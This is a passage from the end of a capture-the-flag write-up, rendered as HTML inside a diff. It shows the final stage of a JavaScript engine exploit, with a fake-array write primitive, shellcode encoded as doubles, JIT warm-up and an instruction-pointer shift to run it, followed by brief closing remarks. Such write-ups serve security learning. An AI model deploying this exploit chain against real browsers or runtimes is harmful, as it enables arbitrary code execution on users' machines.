+    <span class="nx">writeArr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nf">i2f</span><span class="p">(</span><span class="mh">0x0000000200000000</span><span class="nx">n</span> <span class="o">+</span> <span class="nc">BigInt</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x8</span><span class="nx">n</span><span class="p">);</span>
+    <span class="kd">const</span> <span class="nx">fakeArr</span> <span class="o">=</span> <span class="nf">ptr2obj</span><span class="p">(</span><span class="nf">obj2ptr</span><span class="p">(</span><span class="nx">writeArr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">);</span>
+    <span class="nx">fakeArr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nf">i2f</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nf">shellcode</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="p">[</span><span class="mf">1.9711828979523134</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.9562205631094693</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.9557819155246427</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.9711824228871598</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.971182639857203</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.9711829003383248</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.9895153920223886</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.971182898881177</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">]</span>
+<span class="p">};</span>
+<span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">10000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="nf">shellcode</span><span class="p">();</span>
+
+<span class="kd">const</span> <span class="nx">funcAddr</span> <span class="o">=</span> <span class="nf">obj2ptr</span><span class="p">(</span><span class="nx">shellcode</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">codeAddr</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="nx">funcAddr</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">instructionStart</span> <span class="o">=</span> <span class="nx">codeAddr</span> <span class="o">+</span> <span class="mh">0x14</span><span class="nx">n</span><span class="p">;</span>
+<span class="nf">write</span><span class="p">(</span><span class="nx">instructionStart</span><span class="p">,</span> <span class="nf">read</span><span class="p">(</span><span class="nx">instructionStart</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x7f</span><span class="nx">n</span><span class="p">);</span>
+<span class="nf">shellcode</span><span class="p">();</span>
+</code></pre></div></div>
+
+<p>Note2: Original writeup from the author used the same technique of storing doubles on rwx page, but he used wasm code to do so.</p>
+
+<p>Overall this wasn’t extremely hard challenge, but it was really fun to tackle with.</p>
+</div><footer class="flex flex-col centered mb-3 grey5 text-m mt-12">
+  <div class="flex align-center ">
+    <span>Github</span>
+    <hr class="no-margin dotted-hor ml-1">
+    <a  class="ml-1 orange underline hover:text-red transition-colors" href="https://github.com/MatusMandzak">@MatusMandzak</a>
+  </div>
+  <div class="flex align-center ">
+    <span>Email</span>
+    <hr class="no-margin dotted-hor ml-1">
+    <p class="ml-1 orange">mandzak.matus&lt;AT&gt;student.tuke.sk</p>
+  </div>
+</footer>
+</div>
+  </body>
+</html>
